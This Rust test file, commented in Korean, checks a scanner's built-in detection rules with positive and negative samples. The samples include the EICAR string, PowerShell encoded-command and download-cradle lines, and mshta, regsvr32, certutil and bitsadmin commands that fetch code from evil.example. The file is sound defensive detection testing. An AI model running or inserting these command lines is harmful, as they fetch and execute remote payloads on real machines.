//! 내장 규칙 테스트. 규칙마다 양성과 음성 두 가지를 확인한다.

#[path = "../support/mod.rs"]
mod support;

use std::collections::HashSet;

use crate::support::shared_fixtures::eicar;
use bookdoctor::Severity;
use bookdoctor::rule_engine::{self, Compiled};

fn builtin() -> Compiled {
    rule_engine::builtin_compiled()
}

fn names(data: &[u8]) -> Vec<String> {
    let set = builtin();
    set.scan(data).matches.iter().map(|m| set.set().rules[m.rule].name.clone()).collect()
}

fn fires(rule: &str, data: &[u8]) -> bool {
    names(data).iter().any(|n| n == rule)
}

fn wide(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(u16::to_le_bytes).collect()
}

#[test]
fn the_builtin_rules_parse_have_unique_names_and_the_expected_set() {
    let set = builtin();
    let names: Vec<&str> = set.set().rules.iter().map(|r| r.name.as_str()).collect();
    let unique: HashSet<_> = names.iter().collect();
    assert_eq!(unique.len(), names.len(), "{names:?}");
    for want in ["EICAR_TEST_FILE", "POWERSHELL_ENCODED_COMMAND", "POWERSHELL_DOWNLOAD_CRADLE", "LOLBIN_REMOTE_EXEC", "BASE64_PE_HEADER", "HEX_PE_HEADER", "WSCRIPT_SHELL_RUN"] {
        assert!(names.contains(&want), "{want} missing: {names:?}");
    }
    assert!(set.set().rules.iter().all(|r| !r.description.is_empty()), "every builtin rule explains itself");
    // 내장 규칙은 위험한 것만 담는다: critical은 EICAR뿐이다.
    let critical: Vec<_> = set.set().rules.iter().filter(|r| r.severity == Severity::Critical).map(|r| r.name.as_str()).collect();
    assert_eq!(critical, ["EICAR_TEST_FILE"]);
}

#[test]
fn the_eicar_test_string_needs_both_halves() {
    assert!(fires("EICAR_TEST_FILE", &eicar()));
    let mut embedded = b"prefix text ".to_vec();
    embedded.extend(eicar());
    embedded.extend(b" suffix");
    assert!(fires("EICAR_TEST_FILE", &embedded));
    // 앞 절반이나 뒤 절반만으로는 일치하지 않는다.
    assert!(!fires("EICAR_TEST_FILE", b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$ only the first half"));
    assert!(!fires("EICAR_TEST_FILE", b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* only the second half"));
    assert!(!fires("EICAR_TEST_FILE", b"the word EICAR alone"));
}

#[test]
fn powershell_encoded_command() {
    assert!(fires("POWERSHELL_ENCODED_COMMAND", b"powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoA"));
    assert!(fires("POWERSHELL_ENCODED_COMMAND", b"POWERSHELL -EncodedCommand AAAA"));
    assert!(fires("POWERSHELL_ENCODED_COMMAND", &wide("powershell -enc SQBFAFgA")));
    // `-Encoding`은 인코딩 옵션이지 인코딩된 명령이 아니다.
    assert!(!fires("POWERSHELL_ENCODED_COMMAND", b"powershell Get-Content a.txt -Encoding UTF8"));
    assert!(!fires("POWERSHELL_ENCODED_COMMAND", b"-enc SQBFAFgA with no host program named"));
}

#[test]
fn powershell_download_cradle() {
    assert!(fires("POWERSHELL_DOWNLOAD_CRADLE", b"(New-Object Net.WebClient).DownloadString('http://x/a')"));
    assert!(fires("POWERSHELL_DOWNLOAD_CRADLE", b"(new-object net.webclient).downloadfile('http://x/a','b.exe')"));
    assert!(!fires("POWERSHELL_DOWNLOAD_CRADLE", b"Net.WebClient is a .NET class used for HTTP"));
    assert!(!fires("POWERSHELL_DOWNLOAD_CRADLE", b"DownloadString is a method name"));
}

#[test]
fn lolbin_remote_exec() {
    assert!(fires("LOLBIN_REMOTE_EXEC", b"mshta http://evil.example/a.hta"));
    assert!(fires("LOLBIN_REMOTE_EXEC", b"regsvr32 /s /n /u /i:http://evil.example/a.sct scrobj.dll"));
    assert!(fires("LOLBIN_REMOTE_EXEC", b"certutil -urlcache -split -f http://evil.example/a a.exe"));
    assert!(fires("LOLBIN_REMOTE_EXEC", b"bitsadmin /transfer job http://evil.example/a C:\\a.exe"));
    assert!(!fires("LOLBIN_REMOTE_EXEC", b"mshta is a Microsoft HTML Application host"));
    assert!(!fires("LOLBIN_REMOTE_EXEC", b"certutil -hashfile a.txt SHA256"));
    assert!(!fires("LOLBIN_REMOTE_EXEC", b"visit http://example.com for bitsadmin docs"));
}

#[test]
fn base64_and_hex_pe_headers() {
    assert!(fires("BASE64_PE_HEADER", b"var b = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA';"));
    assert!(fires("BASE64_PE_HEADER", b"TVpQAAIAAAAEAA8A"));
    assert!(fires("BASE64_PE_HEADER", &wide("TVqQAAMAAAAEAAAA")));
    assert!(!fires("BASE64_PE_HEADER", b"TVqQ is only the start"));
    assert!(fires("HEX_PE_HEADER", b"payload = 4D5A90000300000004000000FFFF0000"));
    assert!(fires("HEX_PE_HEADER", b"4d5a9000030000000400"));
    assert!(!fires("HEX_PE_HEADER", b"4d5a is only MZ"));
}

#[test]
fn wscript_shell_run() {
    assert!(fires("WSCRIPT_SHELL_RUN", b"Set s = CreateObject(\"WScript.Shell\"): s.Run \"cmd /c calc\""));
    assert!(fires("WSCRIPT_SHELL_RUN", b"new ActiveXObject('wscript.shell').exec('calc')"));
    assert!(!fires("WSCRIPT_SHELL_RUN", b"WScript.Shell is the Windows Script Host shell object"));
    assert!(!fires("WSCRIPT_SHELL_RUN", b"plain prose that mentions .Run and .Exec only"));
}

#[test]
fn ordinary_text_matches_no_builtin_rule() {
    let prose = "안녕하세요. 이 문서는 평범한 글입니다.\nThe quick brown fox jumps over the lazy dog.\n".repeat(50);
    assert!(names(prose.as_bytes()).is_empty());
    assert!(names(&[0u8; 4096]).is_empty());
}
